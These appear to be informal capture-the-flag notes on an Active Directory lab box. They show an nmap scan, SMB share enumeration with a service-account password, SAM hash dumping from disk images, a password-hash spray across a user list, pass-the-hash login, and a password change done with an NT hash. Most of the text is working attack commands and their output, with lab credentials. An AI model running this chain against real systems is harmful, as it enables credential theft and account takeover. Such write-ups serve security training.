
```python
kali@kali ~> nmap -sV -sC 10.10.81.34

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 07:53 EST
Nmap scan report for AWSJPDC0522 (10.10.81.34)
Host is up (0.070s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-28 12:53:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: shibuya.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:AWSJPDC0522.shibuya.vl
| Not valid before: 2025-02-15T07:26:20
|_Not valid after:  2026-02-15T07:26:20
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shibuya.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:AWSJPDC0522.shibuya.vl
| Not valid before: 2025-02-15T07:26:20
|_Not valid after:  2026-02-15T07:26:20
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Not valid before: 2025-02-18T08:24:25
|_Not valid after:  2025-08-20T08:24:25
|_ssl-date: 2025-02-28T12:54:32+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SHIBUYA
|   NetBIOS_Domain_Name: SHIBUYA
|   NetBIOS_Computer_Name: AWSJPDC0522
|   DNS_Domain_Name: shibuya.vl
|   DNS_Computer_Name: AWSJPDC0522.shibuya.vl
|   DNS_Tree_Name: shibuya.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-02-28T12:53:52+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-02-28T12:53:54
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.43 seconds

```




```python
kali@kali ~> nxc smb shibuya.vl -u 'svc_autojoin' -p 'K5&A6Dw9d8jrKWhV' 
SMB         10.10.81.34     445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.10.81.34     445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWhV 
```


```
kali@kali ~> smbclient.py shibuya.vl/svc_autojoin:'K5&A6Dw9d8jrKWhV'@10.10.81.34

Impacket v0.13.0.dev0+20241024.90011.835e175 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands

# shares
ADMIN$
C$
images$
IPC$
NETLOGON
SYSVOL
users
# cd users
[-] No share selected
# ls
[-] No share selected
# usedrs
*** Unknown syntax: usedrs
# users
*** Unknown syntax: users
# use users
# ls
drw-rw-rw-          0  Sun Feb 16 05:50:59 2025 .
drw-rw-rw-          0  Wed Feb 19 07:59:37 2025 ..
drw-rw-rw-          0  Sat Feb 15 01:49:31 2025 Administrator
drw-rw-rw-          0  Sat Feb 15 10:48:20 2025 All Users
drw-rw-rw-          0  Sat Feb 15 10:49:12 2025 Default
drw-rw-rw-          0  Sat Feb 15 10:48:20 2025 Default User
-rw-rw-rw-        174  Sat Feb 15 10:46:52 2025 desktop.ini
drw-rw-rw-          0  Tue Feb 18 14:29:42 2025 nigel.mills
drw-rw-rw-          0  Sat Feb 15 01:49:31 2025 Public
drw-rw-rw-          0  Tue Feb 18 14:36:45 2025 simon.watson
# cd nigel.mills
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# ls
drw-rw-rw-          0  Sun Feb 16 05:50:59 2025 .
drw-rw-rw-          0  Wed Feb 19 07:59:37 2025 ..
drw-rw-rw-          0  Sat Feb 15 01:49:31 2025 Administrator
drw-rw-rw-          0  Sat Feb 15 10:48:20 2025 All Users
drw-rw-rw-          0  Sat Feb 15 10:49:12 2025 Default
drw-rw-rw-          0  Sat Feb 15 10:48:20 2025 Default User
-rw-rw-rw-        174  Sat Feb 15 10:46:52 2025 desktop.ini
drw-rw-rw-          0  Tue Feb 18 14:29:42 2025 nigel.mills
drw-rw-rw-          0  Sat Feb 15 01:49:31 2025 Public
drw-rw-rw-          0  Tue Feb 18 14:36:45 2025 simon.watson
# cd simon.watson

# get desktop.ini

```


i then go back to find a "images$" share within it there are a couple of .wim files and a .cab file

```python
kali@kali ~/v/shibuya> ls
AWSJPWK0222-01.wim  AWSJPWK0222-02.wim  AWSJPWK0222-03.wim  output_directory/  vss-meta.cab
```

```python
kali@kali ~> secretsdump.py  -system SYSTEM -sam SAM LOCAL
Impacket v0.13.0.dev0+20241024.90011.835e175 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x2e971736685fc53bfd5106d471e2f00f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8dcb5ed323d1d09b9653452027e8c013:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9dc1b36c1e31da7926d77ba67c654ae6:::
operator:1000:aad3b435b51404eeaad3b435b51404ee:5d8c3d1a20bd63f60f469f6763ca0d50:::
[*] Cleaning up... 

```



```python
kali@kali ~> nxc smb shibuya.vl -u newshibuyausers.txt -H '5d8c3d1a20bd63f60f469f6763ca0d50'
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Beth.Baker:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Julie.Davies:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Irene.Allan:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Thomas.Brookes:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Russell.Phillips:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Donna.Green:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Natalie.Knowles:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Toby.Lamb:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Jayne.Barnes:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Elliott.Watson:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Adam.Long:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Jean.Allen:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Lauren.Walters:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Leanne.Bentley:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Kieran.Miller:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Holly.Bradley:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Jodie.Khan:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Billy.Smith:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Jeremy.Howells:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Elliott.Storey:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Denise.Harvey:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Ann.Kaur:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Damian.Marshall:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Colin.Gibson:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Georgina.Long:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Bernard.Bevan:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Lawrence.Collins:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Lee.Hunt:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Marcus.Collins:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Alexander.Mitchell:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Keith.Wilson:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [-] shibuya.vl\Joan.Taylor:5d8c3d1a20bd63f60f469f6763ca0d50 STATUS_LOGON_FAILURE 
SMB         10.10.81.34     445    AWSJPDC0522      [+] shibuya.vl\Simon.Watson:5d8c3d1a20bd63f60f469f6763ca0d50 
```


checking in now on this users direectory we can find the flag

```python
kali@kali ~> nxc smb shibuya.vl -u simon.watson -H '5d8c3d1a20bd63f60f469f6763ca0d50'
SMB         10.10.81.34     445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.10.81.34     445    AWSJPDC0522      [+] shibuya.vl\simon.watson:5d8c3d1a20bd63f60f469f6763ca0d50 
```

```python
kali@kali ~> smbclient.py shibuya.vl/simon.watson@10.10.81.34 -hashes ':5d8c3d1a20bd63f60f469f6763ca0d50'
Impacket v0.13.0.dev0+20241024.90011.835e175 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use users
# ls
drw-rw-rw-          0  Sun Feb 16 05:50:59 2025 .
drw-rw-rw-          0  Wed Feb 19 07:59:37 2025 ..
drw-rw-rw-          0  Sat Feb 15 01:49:31 2025 Administrator
drw-rw-rw-          0  Sat Feb 15 10:48:20 2025 All Users
drw-rw-rw-          0  Sat Feb 15 10:49:12 2025 Default
drw-rw-rw-          0  Sat Feb 15 10:48:20 2025 Default User
-rw-rw-rw-        174  Sat Feb 15 10:46:52 2025 desktop.ini
drw-rw-rw-          0  Tue Feb 18 14:29:42 2025 nigel.mills
drw-rw-rw-          0  Sat Feb 15 01:49:31 2025 Public
drw-rw-rw-          0  Tue Feb 18 14:36:45 2025 simon.watson
# cd simon.watson
# ls
drw-rw-rw-          0  Tue Feb 18 14:36:45 2025 .
drw-rw-rw-          0  Sun Feb 16 05:50:59 2025 ..
drw-rw-rw-          0  Sun Feb 16 05:42:06 2025 AppData
drw-rw-rw-          0  Sun Feb 16 05:42:06 2025 Application Data
drw-rw-rw-          0  Sun Feb 16 05:42:06 2025 Cookies
drw-rw-rw-          0  Sun Feb 16 05:42:41 2025 Desktop
drw-rw-rw-          0  Sun Feb 16 05:42:06 2025 Documents
drw-rw-rw-          0  Sun Feb 16 05:42:05 2025 Downloads
drw-rw-rw-          0  Sun Feb 16 05:42:05 2025 Favorites
drw-rw-rw-          0  Sun Feb 16 05:42:05 2025 Links
drw-rw-rw-          0  Sun Feb 16 05:42:06 2025 Local Settings
drw-rw-rw-          0  Sun Feb 16 05:42:05 2025 Music
drw-rw-rw-          0  Sun Feb 16 05:42:06 2025 My Documents
drw-rw-rw-          0  Sun Feb 16 05:42:06 2025 NetHood
-rw-rw-rw-     262144  Sun Feb 16 05:42:05 2025 NTUSER.DAT
-rw-rw-rw-     106496  Sun Feb 16 05:42:05 2025 ntuser.dat.LOG1
-rw-rw-rw-          0  Sun Feb 16 05:42:05 2025 ntuser.dat.LOG2
-rw-rw-rw-      65536  Sun Feb 16 05:42:08 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Sun Feb 16 05:42:05 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Sun Feb 16 05:42:05 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Tue Feb 18 14:30:58 2025 ntuser.ini
drw-rw-rw-          0  Sun Feb 16 05:42:05 2025 Pictures
drw-rw-rw-          0  Sun Feb 16 05:42:06 2025 PrintHood
drw-rw-rw-          0  Sun Feb 16 05:42:06 2025 Recent
drw-rw-rw-          0  Sun Feb 16 05:42:05 2025 Saved Games
drw-rw-rw-          0  Sun Feb 16 05:42:06 2025 SendTo
drw-rw-rw-          0  Sun Feb 16 05:42:06 2025 Start Menu
drw-rw-rw-          0  Sun Feb 16 05:42:06 2025 Templates
drw-rw-rw-          0  Sun Feb 16 05:42:05 2025 Videos
# cd desktop
# ls
drw-rw-rw-          0  Sun Feb 16 05:42:41 2025 .
drw-rw-rw-          0  Tue Feb 18 14:36:45 2025 ..
-rw-rw-rw-         36  Sun Feb 16 05:43:08 2025 flag.txt
```


changepasswd.py

changing someones password using their hash is non-default

Password!

```python
kali@kali ~> changepasswd.py shibuya.vl/simon.watson@10.10.109.139 -hashes ':5d8c3d1a20bd63f60f469f6763ca0d50' -protocol kpasswd -debug
Impacket v0.13.0.dev0+20241024.90011.835e175 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket
New password: 
Retype new password: 
[+] Using the KPassword protocol implies Kerberos authentication (-k)
[*] Changing the password of shibuya.vl\simon.watson
[+] ('simon.watson', 'shibuya.vl', 'Password!', '', '', '5d8c3d1a20bd63f60f469f6763ca0d50', None, None)
[+] Trying to connect to KDC at SHIBUYA.VL:88
[+] Trying to connect to KDC at SHIBUYA.VL:88
[+] b64(authenticator): b'Ym4wbKADAgEFoQwbCnNoaWJ1eWEudmyiGTAXoAMCAQGhEDAOGwxzaW1vbi53YXRzb26kBAICAyWlERgPMjAyNTAyMjgxODE0MjJaphswGaADAgEXoRIEEGOhsfwe0jZahZgcW5MxAC6nBgIEX1Db7Q=='
[+] b64(changePasswdData): b'MA2gCwQJUGFzc3dvcmQh'
[+] b64(encKrbPrivPart): b'fDMwMaARBA8wDaALBAlQYXNzd29yZCGjBgIEX1Db7aQUMBKgAwIBAqELBAlsb2NhbGhvc3Q='
[+] Trying to connect to KDC at shibuya.vl:464
[+] b64(encKrbPrivPart): b'fBkwF6AEBAIAAKQPMA2gAwIBAqEGBAQKCm2L'
[+] resultCode: 0, message: b''
[*] Password was changed successfully.
```



----


root

enumerate sessions relay attack using remote potato, I fucked up here I will have to re-run this box



